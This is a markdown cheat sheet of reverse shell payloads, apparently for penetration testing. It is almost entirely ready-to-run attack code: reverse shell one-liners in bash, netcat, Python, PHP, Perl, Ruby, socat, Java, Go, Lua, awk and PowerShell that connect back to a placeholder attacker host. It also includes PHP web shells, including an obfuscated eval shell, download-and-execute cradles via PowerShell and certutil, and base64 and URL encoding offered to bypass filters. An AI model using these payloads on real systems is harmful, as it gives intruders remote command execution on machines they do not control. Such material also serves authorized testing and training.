# Reverse Shell Payloads Cheat Sheet

> Replace `LHOST` with your IP and `LPORT` with your port.

---

## Listeners

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444          # with arrow keys + history

# socat (full TTY listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

---

## Bash

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Alternative
exec 5<>/dev/tcp/LHOST/LPORT; cat <&5 | while read line; do $line 2>&5 >&5; done

# URL encoded (for web exploits)
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FLHOST%2FLPORT%200%3E%261%22

# Base64 encoded (bypass filters)
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | base64
bash -c '{echo,<BASE64>}|{base64,-d}|bash'
```

---

## Netcat

```bash
# With -e flag (traditional nc)
nc -e /bin/bash LHOST LPORT

# Without -e flag (openbsd nc)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc LHOST LPORT > /tmp/f

# Alternative mkfifo
mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | nc LHOST LPORT 1>/tmp/backpipe
```

---

## Python

```bash
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3 with pty
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

---

## PHP

```bash
# CLI
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'

# Full reverse shell
php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

```php
// Web shell
<?php system($_GET["cmd"]); ?>

// Web reverse shell
<?php $sock=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>

// Obfuscated web shell
<?php @eval($_POST['cmd']); ?>
```

---

## Perl

```bash
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

---

## Ruby

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Socat

```bash
# On target (full TTY)
socat tcp-connect:LHOST:LPORT exec:'bash -li',pty,stderr,setsid,sigint,sane

# Simple
socat tcp-connect:LHOST:LPORT exec:/bin/bash
```

---

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

## Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","LHOST:LPORT");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/sh.go && go run /tmp/sh.go
```

---

## Lua

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('LHOST','LPORT');os.execute('/bin/bash -i <&3 >&3 2>&3');"
```

---

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; print c; while ((c |& getline) > 0) print $0 |& s; close(c); } while(c != "exit") close(s); }}' /dev/null
```

---

## PowerShell (Windows Targets)

```powershell
# One-liner
powershell -nop -c "$client=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

# Download cradle
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"

# Base64 encoded
powershell -EncodedCommand <BASE64_PAYLOAD>
```

---

## Windows CMD

```cmd
certutil -urlcache -split -f http://LHOST/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe
```

---

## Encoding Payloads

```bash
# Base64 encode
echo -n 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | base64

# Execute base64 payload
bash -c '{echo,<BASE64>}|{base64,-d}|bash'

# URL encode with python
python3 -c "import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/LHOST/LPORT 0>&1'))"
```

---

## Resources

- **revshells.com** — generates payloads with your IP/port pre-filled
- **PayloadsAllTheThings** — github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks** — book.hacktricks.xyz

---

## After Getting a Shell — Stabilize

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
stty rows 50 cols 220
```

> See `shell-stabilization.md` for the full stabilization cheat sheet.
